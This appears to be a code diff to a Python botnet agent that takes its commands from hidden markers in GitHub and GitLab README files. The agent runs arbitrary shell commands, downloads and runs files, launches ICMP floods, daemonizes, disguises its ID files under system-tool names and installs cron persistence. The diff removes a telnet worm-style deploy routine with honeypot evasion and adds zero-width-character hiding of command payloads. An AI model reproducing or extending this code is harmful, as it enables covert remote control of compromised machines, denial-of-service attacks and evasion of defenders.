@@ -15,8 +15,8 @@ import random
 import string
 import json
 import base64
+import html
 import socket
-import asyncio
 import subprocess
 import shutil
 import platform
@@ -35,19 +35,14 @@ DEFAULT_POLL_INTERVAL = 60
 MARKER_START = "<!-- CMD_START -->"
 MARKER_END = "<!-- CMD_END -->"
 MAX_FETCH_SIZE = 1_048_576
+MAX_DOWNLOAD_SIZE = 50_000_000
+MAX_SHELL_OUTPUT = 1_048_576
 USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
 
 TOOL_NAMES = [
     "systemd", "cron", "bash", "sshd", "networkd",
     "apt", "dpkg", "iptables", "journald", "udev",
 ]
-
-HONEYPOT_PORTS = [
-    21, 22, 23, 25, 53, 80, 110, 143, 443, 445,
-    993, 995, 3306, 3389, 8080,
-]
-HONEYPOT_THRESHOLD = 11
-
 
 def _id_paths() -> list[str]:
     tag = random.Random(socket.gethostname().encode()).choice(TOOL_NAMES)
@@ -59,6 +54,13 @@ def _id_paths() -> list[str]:
 
 
 def _get_bot_id() -> str:
+    for p_str in _id_paths():
+        p = Path(p_str)
+        if p.exists():
+            stored = p.read_text().strip()
+            if stored:
+                return stored
+
     for tag in TOOL_NAMES:
         for prefix in ("/dev/shm/.", "/tmp/.", "/var/tmp/."):
             for suffix in ("-private", "_cache", "-status"):
@@ -111,6 +113,7 @@ class RepoSource:
     active: bool = True
     fail_count: int = 0
     last_success: float = 0.0
+    last_fail: float = 0.0
 
     @property
     def raw_url(self) -> str:
@@ -143,7 +146,7 @@ class RepoSource:
 
 @dataclass
 class PBConfig:
-    repos: list = field(default_factory=list)
+    repos: list[RepoSource] = field(default_factory=list)
     poll_interval: int = DEFAULT_POLL_INTERVAL
     jitter: int = 15
     max_fails_before_skip: int = 5
@@ -154,7 +157,9 @@ class PBConfig:
         data = {
             "repos": [
                 {"owner": r.owner, "repo": r.repo, "platform": r.platform,
-                 "branch": r.branch, "file_path": r.file_path}
+                 "branch": r.branch, "file_path": r.file_path,
+                 "fail_count": r.fail_count, "last_fail": r.last_fail,
+                 "last_success": r.last_success}
                 for r in self.repos
             ],
             "poll_interval": self.poll_interval,
@@ -235,18 +240,6 @@ def fetch_from_repo(repo: RepoSource, use_api: bool = False) -> str | None:
     return fetch_raw(repo.raw_url)
 
 
-def _check_404(repo: RepoSource) -> bool:
-    req = urllib.request.Request(repo.raw_url, method="HEAD",
-                                headers={"User-Agent": USER_AGENT})
-    try:
-        with urllib.request.urlopen(req, timeout=10) as resp:
-            return resp.status == 200
-    except urllib.error.HTTPError as e:
-        return e.code != 404
-    except Exception:
-        return False
-
-
 def fetch_with_fallback(config: PBConfig) -> tuple[str | None, RepoSource | None]:
     candidates = [r for r in config.repos if r.active]
     random.shuffle(candidates)
@@ -254,13 +247,8 @@ def fetch_with_fallback(config: PBConfig) -> tuple[str | None, RepoSource | None
     for repo in candidates:
         if repo.fail_count >= config.max_fails_before_skip:
             backoff = min(2 ** min(repo.fail_count, 10) * config.poll_interval, 3600)
-            if time.time() - repo.last_success < backoff:
+            if repo.last_fail > 0 and time.time() - repo.last_fail < backoff:
                 continue
-            repo.fail_count = 0
-
-        if not _check_404(repo):
-            repo.fail_count += 1
-            continue
 
         content = fetch_from_repo(repo, use_api=config.use_api)
 
@@ -270,6 +258,7 @@ def fetch_with_fallback(config: PBConfig) -> tuple[str | None, RepoSource | None
             return content, repo
         else:
             repo.fail_count += 1
+            repo.last_fail = time.time()
 
     return None, None
 
@@ -328,7 +317,13 @@ def extract_commands(content: str) -> tuple[list[str], dict | None]:
         except Exception:
             pass
 
-    return commands, None
+    seen = set()
+    deduped = []
+    for cmd in commands:
+        if cmd not in seen:
+            seen.add(cmd)
+            deduped.append(cmd)
+    return deduped, None
 
 
 def command_hash(commands: list[str]) -> str:
@@ -337,13 +332,20 @@ def command_hash(commands: list[str]) -> str:
 
 def exec_shell(cmd_str: str) -> str:
     try:
-        result = subprocess.run(
-            cmd_str, shell=True, capture_output=True,
-            text=True, timeout=60,
+        proc = subprocess.Popen(
+            cmd_str, shell=True,
+            stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
         )
-        return result.stdout + result.stderr
-    except subprocess.TimeoutExpired:
-        return "[timeout after 60s]"
+        try:
+            output = proc.stdout.read(MAX_SHELL_OUTPUT)
+        finally:
+            proc.stdout.close()
+            try:
+                proc.wait(timeout=60)
+            except subprocess.TimeoutExpired:
+                proc.kill()
+                proc.wait()
+        return output.decode(errors="replace")
     except Exception as e:
         return f"[error: {e}]"
 
@@ -352,7 +354,7 @@ def download_file(url: str, dest: str, run: bool = False, hide: bool = False):
     try:
         req = urllib.request.Request(url, headers={"User-Agent": USER_AGENT})
         with urllib.request.urlopen(req, timeout=30) as resp:
-            data = resp.read()
+            data = resp.read(MAX_DOWNLOAD_SIZE)
 
         dest_path = Path(dest)
         dest_path.write_bytes(data)
@@ -378,8 +380,9 @@ def download_file(url: str, dest: str, run: bool = False, hide: bool = False):
 
 def pop_message(message: str):
     try:
+        safe_message = html.escape(message, quote=True)
         with tempfile.NamedTemporaryFile(suffix=".html", delete=False, mode="w") as f:
-            f.write(f"<html><body><h2>{message}</h2></body></html>")
+            f.write(f"<html><body><h2>{safe_message}</h2></body></html>")
             path = f.name
 
         system = platform.system()
@@ -389,6 +392,8 @@ def pop_message(message: str):
             subprocess.Popen(["open", path])
         elif system == "Windows":
             subprocess.Popen(["rundll32", "url.dll,FileProtocolHandler", path])
+
+        threading.Timer(30, lambda: Path(path).unlink(missing_ok=True)).start()
     except Exception:
         pass
 
@@ -458,13 +463,15 @@ def execute_command(cmd: str, config: PBConfig):
 
     elif action == "dos":
         tokens = args_str.split()
-        if len(tokens) >= 3:
-            target, port, duration = tokens[0], tokens[1], tokens[2]
+        if len(tokens) >= 2:
+            target = tokens[0]
+            duration = tokens[-1]
             try:
                 secs = min(int(duration), 300)
                 subprocess.Popen(
-                    f"timeout {secs} ping -f {target} > /dev/null 2>&1",
-                    shell=True,
+                    ["timeout", str(secs), "ping", "-f", target],
+                    stdout=subprocess.DEVNULL,
+                    stderr=subprocess.DEVNULL,
                 )
             except Exception:
                 pass
@@ -491,132 +498,6 @@ def execute_command(cmd: str, config: PBConfig):
         sys.exit(0)
 
 
-def deploy_agent(target_str: str, config: PBConfig):
-    try:
-        ip, port, user, pw = target_str.strip().split(":")
-        port = int(port)
-    except ValueError:
-        print(f"{C.RED}[!] Format: ip:port:user:pass{C.RESET}")
-        return
-
-    if is_honeypot_sync(ip):
-        print(f"{C.YELLOW}[!] Skipping {ip} — honeypot detected ({HONEYPOT_THRESHOLD}+ ports open){C.RESET}")
-        return
-
-    print(f"{C.YELLOW}[*] Deploying to {ip}:{port} as {user}...{C.RESET}")
-
-    agent_file = Path(__file__)
-    if not agent_file.exists():
-        print(f"{C.RED}[!] {agent_file} not found{C.RESET}")
-        return
-
-    try:
-        sock = socket.create_connection((ip, int(port)), timeout=10)
-        sock.settimeout(5)
-
-        def _recv_until(marker: bytes, timeout: float = 5.0) -> bytes:
-            buf = b""
-            deadline = time.time() + timeout
-            while time.time() < deadline:
-                try:
-                    chunk = sock.recv(4096)
-                    if not chunk:
-                        break
-                    buf += chunk
-                    if marker in buf:
-                        return buf
-                except socket.timeout:
-                    break
-            return buf
-
-        _recv_until(b"ogin:")
-        sock.sendall(user.encode() + b"\n")
-        _recv_until(b"assword:")
-        sock.sendall(pw.encode() + b"\n")
-        resp = _recv_until(b"#", timeout=6)
-        if not any(p in resp for p in (b"#", b">", b"$")):
-            raise Exception("No shell prompt")
-
-        agent_data = agent_file.read_bytes()
-        b64 = base64.b64encode(agent_data).decode()
-
-        zwenc_file = Path(__file__).parent / "zwenc.py"
-        zwenc_b64 = base64.b64encode(zwenc_file.read_bytes()).decode()
-
-        sock.sendall(b"rm -f /tmp/pb.b64 /tmp/pb.py /tmp/zwenc.py /tmp/pb_config.json\n")
-        time.sleep(0.1)
-
-        for i in range(0, len(zwenc_b64), 512):
-            chunk = zwenc_b64[i:i + 512]
-            sock.sendall(f"echo '{chunk}' >> /tmp/zw.b64\n".encode())
-            time.sleep(0.05)
-        sock.sendall(b"base64 -d /tmp/zw.b64 > /tmp/zwenc.py && rm /tmp/zw.b64\n")
-        time.sleep(0.1)
-
-        for i in range(0, len(b64), 512):
-            chunk = b64[i:i + 512]
-            sock.sendall(f"echo '{chunk}' >> /tmp/pb.b64\n".encode())
-            time.sleep(0.05)
-
-        sock.sendall(b"base64 -d /tmp/pb.b64 > /tmp/pb.py && rm /tmp/pb.b64\n")
-        time.sleep(0.1)
-
-        cfg_data = base64.b64encode(json.dumps({
-            "repos": [{"owner": r.owner, "repo": r.repo, "platform": r.platform,
-                       "branch": r.branch, "file_path": r.file_path}
-                      for r in config.repos],
-            "poll_interval": config.poll_interval,
-            "jitter": config.jitter,
-            "max_fails_before_skip": config.max_fails_before_skip,
-            "use_api": config.use_api,
-            "last_command_hash": "",
-        }).encode()).decode()
-        sock.sendall(f"echo '{cfg_data}' | base64 -d > /tmp/pb_config.json\n".encode())
-        time.sleep(0.1)
-
-        sock.sendall(b"nohup python3 /tmp/pb.py agent -c /tmp/pb_config.json --daemon --no-persist > /dev/null 2>&1 &\n")
-        time.sleep(0.3)
-        sock.close()
-        print(f"{C.GREEN}[+] Deployed to {ip}:{port}{C.RESET}")
-    except Exception as e:
-        print(f"{C.RED}[!] Deploy failed: {e}{C.RESET}")
-
-
-def deploy_from_file(path: str, config: PBConfig):
-    if not os.path.exists(path):
-        print(f"{C.RED}[!] File not found: {path}{C.RESET}")
-        return
-
-    targets = []
-    with open(path) as f:
-        for line in f:
-            line = line.strip()
-            if line and not line.startswith("#"):
-                targets.append(line)
-
-    if not targets:
-        return
-
-    ips = []
-    for t in targets:
-        try:
-            ips.append(t.split(":")[0])
-        except (ValueError, IndexError):
-            ips.append("")
-
-    print(f"{C.YELLOW}[*] Checking {len(ips)} targets for honeypots (async)...{C.RESET}")
-    try:
-        hp_results = asyncio.run(check_honeypots_batch(ips))
-    except Exception:
-        hp_results = {}
-
-    for target, ip in zip(targets, ips):
-        if hp_results.get(ip, False):
-            print(f"{C.YELLOW}[!] Skipping {ip} — honeypot{C.RESET}")
-            continue
-        deploy_agent(target, config)
-
-
 def daemonize():
     try:
         if os.fork() > 0:
@@ -626,41 +507,13 @@ def daemonize():
             sys.exit(0)
         sys.stdout.flush()
         sys.stderr.flush()
-        devnull = open(os.devnull, "w")
-        os.dup2(devnull.fileno(), sys.stdout.fileno())
-        os.dup2(devnull.fileno(), sys.stderr.fileno())
+        devnull_r = open(os.devnull, "r")
+        devnull_w = open(os.devnull, "w")
+        os.dup2(devnull_r.fileno(), sys.stdin.fileno())
+        os.dup2(devnull_w.fileno(), sys.stdout.fileno())
+        os.dup2(devnull_w.fileno(), sys.stderr.fileno())
     except OSError:
         pass
-
-
-async def _check_port(ip: str, port: int, timeout: float = 2.0) -> bool:
-    try:
-        _, writer = await asyncio.wait_for(
-            asyncio.open_connection(ip, port), timeout=timeout)
-        writer.close()
-        await writer.wait_closed()
-        return True
-    except Exception:
-        return False
-
-
-async def _is_honeypot(ip: str, threshold: int = HONEYPOT_THRESHOLD) -> bool:
-    tasks = [_check_port(ip, p) for p in HONEYPOT_PORTS]
-    results = await asyncio.gather(*tasks)
-    return sum(results) >= threshold
-
-
-async def check_honeypots_batch(ips: list[str], threshold: int = HONEYPOT_THRESHOLD) -> dict[str, bool]:
-    tasks = {ip: _is_honeypot(ip, threshold) for ip in ips}
-    results = await asyncio.gather(*tasks.values())
-    return dict(zip(tasks.keys(), results))
-
-
-def is_honeypot_sync(ip: str) -> bool:
-    try:
-        return asyncio.run(_is_honeypot(ip))
-    except Exception:
-        return False
 
 
 def _install_cron(config_path: str):
@@ -866,6 +719,16 @@ MIT
             print(f"{C.GREEN}--- End ---{C.RESET}\n")
             Path("README_payload.md").write_text(readme)
             print(f"  Saved to README_payload.md")
+        elif line.startswith("genzw"):
+            payload = json.dumps({"cmd": commands}, separators=(",", ":")).encode()
+            base_readme = "# Project\n\nRepository.\n\n## License\nMIT\n"
+            injected = zwenc.inject(base_readme, payload, pad="pad" in line)
+            print(f"\n{C.GREEN}--- Generated README (zero-width) ---{C.RESET}")
+            print(zwenc.strip(injected))
+            print(f"{C.GREEN}--- End ---{C.RESET}")
+            print(f"  {C.DIM}({len(payload)} bytes payload, {len(payload)*4} ZW chars){C.RESET}\n")
+            Path("README_payload.md").write_text(injected)
+            print(f"  Saved to README_payload.md")
         elif line == "clear":
             commands.clear()
             print(f"  {C.DIM}Commands cleared{C.RESET}")
@@ -881,7 +744,7 @@ MIT
     cmd <shell command>               — Execute shell command
     shell <shell command>             — Alias for cmd
     download <url> <dest> [RUN] [HIDE] — Download file
-    dos <ip> <port> <seconds>         — Network flood
+    dos <ip> <seconds>                — ICMP flood (max 300s)
     popmsg <message>                  — Browser popup
     add_repo [gh:|gl:]<owner/repo>    — Add fallback repo (gh: or gl: prefix)
     set_interval <seconds>            — Change poll interval
@@ -892,6 +755,8 @@ MIT
     list    — Show queued commands
     gen     — Generate README with marker tags
     gen64   — Generate README with base64 encoding
+    genzw   — Generate README with zero-width encoding (preferred)
+    genzw pad — Same with 1MB ZW padding
     clear   — Clear command queue
     exit    — Quit
 """)
@@ -948,7 +813,6 @@ def main():
 modes:
   agent    Run the C2 agent (polls repos for commands)
   server   Interactive shell to generate README payloads
-  deploy   Deploy agent to telnet targets
   config   Generate a default config file
   test     Test fetching from configured repos
 
@@ -963,13 +827,11 @@ examples:
   %(prog)s agent -c pb_config.json
   %(prog)s agent -r user/repo1 -r gl:user/repo2 --daemon
   %(prog)s server
-  %(prog)s deploy --target 192.168.1.1:23:root:pass
-  %(prog)s deploy --file targets.txt
   %(prog)s config -r user/c2-primary -r gl:user/c2-backup
   %(prog)s test -c pb_config.json
 """,
     )
-    parser.add_argument("mode", choices=["agent", "server", "deploy", "config", "test"],
+    parser.add_argument("mode", choices=["agent", "server", "config", "test"],
                         help="Operating mode")
     parser.add_argument("-c", "--config", default=CONFIG_FILE,
                         help="Config file path")
@@ -983,10 +845,6 @@ examples:
                         help="Don't install persistence")
     parser.add_argument("--daemon", action="store_true",
                         help="Run agent as background daemon")
-    parser.add_argument("--target", default="",
-                        help="Deploy target (ip:port:user:pass)")
-    parser.add_argument("--file", default="",
-                        help="Deploy targets file (one ip:port:user:pass per line)")
     parser.add_argument("-v", "--verbose", action="store_true")
     args = parser.parse_args()
 
@@ -1011,23 +869,6 @@ examples:
 
     elif args.mode == "server":
         server_shell()
-        return
-
-    elif args.mode == "deploy":
-        config = PBConfig.load(args.config)
-        if cli_repos:
-            config.repos = cli_repos
-
-        if not config.repos:
-            print(f"{C.RED}[!] No repos configured. Use -r or -c.{C.RESET}")
-            sys.exit(1)
-
-        if args.target:
-            deploy_agent(args.target, config)
-        elif args.file:
-            deploy_from_file(args.file, config)
-        else:
-            print(f"{C.RED}[!] Specify --target or --file{C.RESET}")
         return
 
     elif args.mode == "test":
